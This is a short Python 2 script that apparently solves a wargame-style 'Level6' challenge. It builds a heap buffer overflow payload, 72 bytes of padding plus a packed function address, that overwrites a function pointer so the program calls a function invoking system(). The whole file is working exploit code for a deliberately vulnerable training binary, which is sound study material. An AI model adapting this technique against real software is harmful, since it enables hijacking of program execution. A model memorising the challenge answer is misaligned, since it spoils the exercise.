#!/usr/bin/env python2

import struct

# Level6 - Heap Buffer Overflow Exploit
# Overwrite function pointer to redirect execution from m() to n()

# Target function addresses
n_function = 0x08048454      # Function n() - calls system() (our goal)
m_function = 0x08048468      # Function m() - prints "Nope" (default)

# Heap layout analysis:
# buffer1 = malloc(64)     <- strcpy destination  
# [heap metadata ~8 bytes]
# funcptr = malloc(4)      <- function pointer storage
#
# Total offset = 64 (buffer) + 8 (metadata) = 72 bytes

offset = 72
padding = "A" * offset
target_address = struct.pack("<L", n_function)

payload = padding + target_address

print payload